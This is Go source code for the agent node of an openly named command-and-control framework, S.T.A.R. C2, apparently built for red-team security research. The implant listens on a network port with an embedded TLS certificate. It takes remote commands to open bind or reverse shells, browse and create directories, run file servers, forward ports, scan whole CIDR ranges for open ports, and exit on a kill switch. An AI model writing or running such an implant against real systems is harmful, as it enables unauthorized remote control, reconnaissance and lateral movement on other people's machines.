package main

import (
	"bytes"
	"embed"
	"encoding/gob"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/CyberSecurityN00b/star/pkg/star"
)

//go:embed connection.crt connection.key
var fs embed.FS

func main() {
	initAgent()
	star.ParameterHandling()

	fmt.Println("Hello! This is an agent node for the S.T.A.R. C2 framework!")
	fmt.Println("For more information, check out https://github.com/CyberSecurityN00b/star")
	fmt.Println()

	// SECURITY RESEARCHER TODO: Configure default connections here
	star.NewTCPListener("0.0.0.0:42069") // Create a listener
	//star.NewTCPConnection("www.example.com:80") // Connect to a listener

	// If nothing is open, just bail
	bailSynchronization := time.NewTicker(1 * time.Minute)
	go func() {
		for {
			select {
			case <-bailSynchronization.C:
				star.CheckNoActivePorts()
			}
		}
	}()

	// Send a "hello" message to any existing connections
	helloMsg := star.NewMessageHello()
	helloMsg.Send(star.ConnectID{})

	exitSignal := make(chan os.Signal)
	signal.Notify(exitSignal, syscall.SIGINT, syscall.SIGTERM)
	es := <-exitSignal

	//Let the terminal know we closed due to a signal
	errMsg := star.NewMessageError(star.MessageErrorResponseTypeAgentExitSignal, fmt.Sprintf("%d", es))
	errMsg.Send(star.ConnectID{})

	//Handle termination
	termMsg := star.NewMessageTerminate(star.MessageTerminateTypeAgent, 0)
	star.ThisNode.MessageProcessor(termMsg)
}

///////////////////////////////////////////////////////////////////////////////

func initAgent() {
	star.STARCoreSetup()
	star.ThisNode = star.NewNode(star.NodeTypeAgent)
	star.ThisNode.MessageProcessor = AgentProcessMessage
	star.ThisNode.Printer = func(star.NodeID, star.StreamID, ...interface{}) {}

	star.ThisNodeInfo.Setup()

	// Setup connection cert
	conncrt, err := fs.ReadFile("connection.crt")
	if err != nil {
		os.Exit(1)
	}
	connkey, err := fs.ReadFile("connection.key")
	if err != nil {
		os.Exit(1)
	}
	err = star.SetupConnectionCertificate(conncrt, connkey)
	if err != nil {
		os.Exit(1)
	}
}

///////////////////////////////////////////////////////////////////////////////

func AgentProcessMessage(msg *star.Message) {
	switch msg.Type {
	case star.MessageTypeBind:
		AgentProcessBind(msg)
	case star.MessageTypeConnect:
		AgentProcessConnect(msg)
	case star.MessageTypeKillSwitch:
		AgentProcessKillSwitch(msg)
	case star.MessageTypeSyncRequest:
		AgentProcessSyncRequest(msg)
	case star.MessageTypeTerminate:
		AgentProcessTerminateRequest(msg)
	case star.MessageTypeShellBind:
		AgentProcessShellBindRequest(msg)
	case star.MessageTypeShellConnection:
		AgentProcessShellConnectionRequest(msg)
	case star.MessageTypeRemoteCDRequest:
		AgentProcessRemoteCDRequest(msg)
	case star.MessageTypeRemoteLSRequest:
		AgentProcessRemoteLSRequest(msg)
	case star.MessageTypeRemoteMkDirRequest:
		AgentProcessRemoteMkDirRequest(msg)
	case star.MessageTypeRemotePWDRequest:
		AgentProcessRemotePWDRequest(msg)
	case star.MessageTypeRemoteTmpDirRequest:
		AgentProcessRemoteTmpDirRequest(msg)
	case star.MessageTypeFileServerBind:
		AgentProcessFileServerBind(msg)
	case star.MessageTypeFileServerConnect:
		AgentProcessFileServerConnect(msg)
	case star.MessageTypePortForwardRequest:
		star.ProcessMessagePortForward(msg)
	case star.MessageTypePortScanRequest:
		AgentProcessPortScanRequest(msg)
	}
}

func AgentProcessBind(msg *star.Message) {
	var reqMsg star.MessageBindRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		switch reqMsg.Type {
		case star.ConnectorType_TCPTLS:
			var address string
			var b bytes.Buffer

			b.Write(reqMsg.Data)
			err := gob.NewDecoder(&b).Decode(&address)
			if err == nil {
				star.NewTCPListener(address)
			} else {
				errMsg := star.NewMessageError(star.MessageErrorResponseTypeGobDecodeError, fmt.Sprintf("%d->%d", msg.Type, reqMsg.Type))
				errMsg.Destination = msg.Source
				errMsg.Send(star.ConnectID{})
			}
		}
	}
}

func AgentProcessConnect(msg *star.Message) {
	var reqMsg star.MessageConnectRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		switch reqMsg.Type {
		case star.ConnectorType_TCPTLS:
			var address string
			var b bytes.Buffer

			b.Write(reqMsg.Data)
			err := gob.NewDecoder(&b).Decode(&address)
			if err == nil {
				star.NewTCPConnection(address)
			} else {
				errMsg := star.NewMessageError(star.MessageErrorResponseTypeGobDecodeError, fmt.Sprintf("%d->%d", msg.Type, reqMsg.Type))
				errMsg.Destination = msg.Source
				errMsg.Send(star.ConnectID{})
			}
		default:
			errMsg := star.NewMessageError(star.MessageErrorResponseTypeUnsupportedConnectorType, fmt.Sprintf("%d->%d", msg.Type, reqMsg.Type))
			errMsg.Destination = msg.Source
			errMsg.Send(star.ConnectID{})
		}
	}
}

func AgentProcessKillSwitch(msg *star.Message) {
	var reqMsg star.MessageKillSwitchRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		// TODO: Cleanup
		os.Exit(1)
	}
}

func AgentProcessSyncRequest(msg *star.Message) {
	var reqMsg star.MessageSyncRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		syncMsg := star.NewMessageSyncResponse()
		syncMsg.Destination = msg.Source
		syncMsg.Send(star.ConnectID{})
	}
}

func AgentProcessTerminateRequest(msg *star.Message) {
	var reqMsg star.MessageTerminateRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		invalid := false
		switch reqMsg.Type {
		case star.MessageTerminateTypeAgent:
			os.Exit(1)
		case star.MessageTerminateTypeConnection:
			id, ok := star.ThisNodeInfo.ConnectionIDs[reqMsg.Index]
			if !ok {
				invalid = true
			} else {
				conn, ok := star.GetConnectionById(id)
				if !ok {
					invalid = true
				} else {
					conn.Close()
					star.ThisNodeInfo.RemoveConnector(id)
				}
			}
		case star.MessageTerminateTypeListener:
			id, ok := star.ThisNodeInfo.ListenerIDs[reqMsg.Index]
			if !ok {
				invalid = true
			} else {
				listener, ok := star.GetListener(id)
				if !ok {
					invalid = true
				} else {
					listener.Close()
					star.ThisNodeInfo.RemoveListener(id)
				}
			}
		case star.MessageTerminateTypeStream:
			stream, ok := star.GetActiveStream(star.ThisNodeInfo.StreamIDs[reqMsg.Index])
			if !ok {
				invalid = true
			} else {
				go stream.Close()
			}
		default:
			errMsg := star.NewMessageError(star.MessageErrorResponseTypeUnsupportedTerminationType, fmt.Sprintf("%d", reqMsg.Type))
			errMsg.Destination = msg.Source
			errMsg.Send(star.ConnectID{})
		}

		if invalid {
			errMsg := star.NewMessageError(star.MessageErrorResponseTypeInvalidTerminationIndex, fmt.Sprintf("%d->%d", reqMsg.Type, reqMsg.Index))
			errMsg.Destination = msg.Source
			errMsg.Send(star.ConnectID{})
		}
	}
	syncMsg := star.NewMessageSyncResponse()
	syncMsg.Send(star.ConnectID{})
}

func AgentProcessShellBindRequest(msg *star.Message) {
	var reqMsg star.MessageShellBindRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		star.NewShellListener(reqMsg.Address, reqMsg.Type, reqMsg.Requester)
	}
}

func AgentProcessShellConnectionRequest(msg *star.Message) {
	var reqMsg star.MessageShellConnectionRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		star.NewShellConnection(reqMsg.Address, reqMsg.Type, reqMsg.Requester)
	}
}

func AgentProcessRemoteCDRequest(msg *star.Message) {
	var reqMsg star.MessageRemoteCDRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		olddirectory, _ := os.Getwd()
		os.Chdir(reqMsg.Directory)
		newdirectory, _ := os.Getwd()

		resMsg := star.NewMessageRemoteCDResponse(newdirectory, olddirectory, msg.Source)
		resMsg.Send(star.ConnectID{})
	}
}

func AgentProcessRemoteLSRequest(msg *star.Message) {
	var reqMsg star.MessageRemoteLSRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		files, _ := ioutil.ReadDir(reqMsg.Directory)

		resMsg := star.NewMessageRemoteLSResponse(reqMsg.Directory, files)
		resMsg.Destination = msg.Source
		resMsg.Send(star.ConnectID{})
	}
}

func AgentProcessRemoteMkDirRequest(msg *star.Message) {
	var reqMsg star.MessageRemoteMkDirRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		err = os.MkdirAll(reqMsg.Directory, 0700)
		if err != nil {
			errMsg := star.NewMessageError(star.MessageErrorResponseTypeDirectoryCreationError, err.Error())
			errMsg.Destination = msg.Source
			errMsg.Send(star.ConnectID{})

			return
		}

		err = os.Chdir(reqMsg.Directory)
		if err == nil {
			directory, _ := os.Getwd()

			resMsg := star.NewMessageRemoteMkDirResponse(directory)
			resMsg.Send(star.ConnectID{})
		}
	}
}

func AgentProcessRemotePWDRequest(msg *star.Message) {
	var reqMsg star.MessageRemotePWDRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		directory, _ := os.Getwd()

		resMsg := star.NewMessageRemotePWDResponse(directory)
		resMsg.Destination = msg.Source
		resMsg.Send(star.ConnectID{})
	}
}

func AgentProcessRemoteTmpDirRequest(msg *star.Message) {
	var reqMsg star.MessageRemoteTmpDirRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		dir, err := os.MkdirTemp("", "")
		if err != nil {
			errMsg := star.NewMessageError(star.MessageErrorResponseTypeDirectoryCreationError, err.Error())
			errMsg.Destination = msg.Source
			errMsg.Send(star.ConnectID{})

			return
		}

		err = os.Chdir(dir)
		if err == nil {
			directory, _ := os.Getwd()

			resMsg := star.NewMessageRemoteTmpDirResponse(directory)
			resMsg.Send(star.ConnectID{})
		}
	}
}

func AgentProcessFileServerBind(msg *star.Message) {
	var reqMsg star.MessageFileServerBindRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		star.NewFileServerListener(reqMsg.Address, reqMsg.Type, msg.Source, reqMsg.FileConnID)
	}
}

func AgentProcessFileServerConnect(msg *star.Message) {
	var reqMsg star.MessageFileServerConnectRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		star.NewFileServerConnection(reqMsg.Address, reqMsg.Type, msg.Source, reqMsg.FileConnID)
	}
}

// AgentProcessPortScanRequest's logic is based on https://medium.com/@KentGruber/building-a-high-performance-port-scanner-with-golang-9976181ec39d
func AgentProcessPortScanRequest(msg *star.Message) {
	var reqMsg star.MessagePortScanRequest

	err := msg.GobDecodeMessage(&reqMsg)
	if err == nil {
		// Define the actual scan function
		portscanip := func(ip string, ports string) {
			wg := sync.WaitGroup{}
			openPortsLock := &sync.Mutex{}

			var openPorts []string
			var scanport func(port string)

			// Keep this nested to portscanip so it accesses the same variables
			scanport = func(port string) {
				defer wg.Done()
				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ip, port), time.Duration(3)*time.Second)

				if err != nil {
					// Possible detection signature :(
					if strings.Contains(err.Error(), "too many open files") {
						time.Sleep(time.Duration(5) * time.Second)
						// Try again
						wg.Add(1)
						scanport(port)
					}
					return
				} else {
					// Port's open!
					openPortsLock.Lock()
					openPorts = append(openPorts, port)
					openPortsLock.Unlock()
					conn.Close()
				}
			}

			// Convert port string to array of numbers
			if ports == "" {
				for i := 1; i < 65536; i++ {
					wg.Add(1)
					go scanport(strconv.Itoa(i))
				}
			} else {
				// Check all specified ports
				for _, port := range strings.Split(ports, ",") {
					wg.Add(1)
					go scanport(port)
				}
			}

			// Wait for all the above to get done
			wg.Wait()

			if len(openPorts) == 0 {
				openPorts = append(openPorts, "none")
			}

			resMsg := star.NewMessagePortScanResponse(ip, strings.Join(openPorts, ","))
			resMsg.Send(star.ConnectID{})
		}

		// Check if this is a CIDR or an IP
		ip, ipNet, err := net.ParseCIDR(reqMsg.IP)
		if err != nil {
			// Must be a single IP!
			portscanip(reqMsg.IP, reqMsg.Ports)
		} else {
			// Below based on https://gist.github.com/kotakanbe/d3059af990252ba89a82

			// Increments an IP address
			incip := func(ip net.IP) {
				for j := len(ip) - 1; j >= 0; j-- {
					ip[j]++
					if ip[j] > 0 {
						break
					}
				}
			}

			// Cycle through that CIDR!
			for ip := ip.Mask(ipNet.Mask); ipNet.Contains(ip); incip(ip) {
				portscanip(ip.String(), reqMsg.Ports)
			}
		}

	}
}

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
